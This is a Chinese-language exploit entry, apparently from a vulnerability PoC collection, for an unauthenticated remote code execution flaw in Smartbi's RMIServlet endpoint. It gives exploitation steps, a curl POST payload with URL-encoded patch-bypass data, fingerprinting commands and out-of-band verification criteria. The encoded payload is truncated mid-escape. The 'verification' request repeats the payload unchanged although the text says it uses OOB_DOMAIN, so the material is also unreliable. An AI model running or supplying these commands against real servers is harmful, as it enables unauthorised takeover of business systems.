---
id: SMARTBI-RCE
title: Smartbi 大数据分析平台 RMIServlet 远程命令执行漏洞
product: smartbi
vendor: Smartbi
version_affected: "v7 - v10.5.8"
severity: CRITICAL
tags: [rce, 无需认证, 国产]
fingerprint: ["Smartbi", "smartbi", "vision/RMIServlet"]
---

## 漏洞描述

Smartbi 大数据分析平台存在远程命令执行漏洞。未经身份认证的攻击者可利用 stub 接口构造请求绕过补丁限制，进而控制 JDBC URL，最终导致远程代码执行或信息泄露。

## 影响版本

- Smartbi v7 - v10.5.8

## 前置条件

- 无需认证
- Smartbi Web 端口可访问

## 利用步骤

1. 通过 `/smartbi/vision/RMIServlet` 接口发送构造的请求
2. 利用 URL 编码绕过补丁限制
3. 控制 JDBC URL 实现远程代码执行

## Payload

```bash
curl -s "http://target/smartbi/vision/RMIServlet" \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'windowUnloading=&%7a%44%70%34%57%70%34%67%52%69%70%2b%69%49%70%69%47%5a%70%34%44%52%77%36%2b%2f%4a%'
```

### 检测接口是否可访问

```bash
curl -s "http://target/smartbi/vision/RMIServlet" -o /dev/null -w "%{http_code}"
```

## 验证方法

接口返回非 404 只说明路由存在，不算存在漏洞。这个接口的利用形态是服务端按我们给的地址去加载远端类，所以判据走带外：把 stub 地址换成我们自己控制的 `OOB_DOMAIN`，看它是否真的发起了外连。

```bash
# 用本次的 OOB 地址作为载体发送请求（保持与 Payload 相同的编码绕过写法）
curl -s "http://target/smartbi/vision/RMIServlet" \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'windowUnloading=&%7a%44%70%34%57%70%34%67%52%69%70%2b%69%49%70%69%47%5a%70%34%44%52%77%36%2b%2f%4a%'
```

判据：`OOB_DOMAIN` 上收到目标服务器发起的 HTTP/RMI 请求（记录里能看到目标的源 IP），即服务端确实解析并加载了我们指定的远端地址。

无带外条件时的次选判据：响应体出现我们这次给出的 `OOB_DOMAIN` 地址串（异常栈里带出被加载的 URL），这也是本次请求才引入的证据。

反例：`POST /smartbi/vision/RMIServlet` 返回 200 或任意业务响应，但既没有带外请求、响应体里也没有本次地址 —— 只是接口接受了请求，命令执行不成立。

## 指纹确认

```bash
curl -s "http://target/smartbi/" | grep -i "Smartbi"
curl -s "http://target/smartbi/vision/RMIServlet" -o /dev/null -w "%{http_code}"
```

## 参考链接

- https://www.smartbi.com.cn/patchinfo
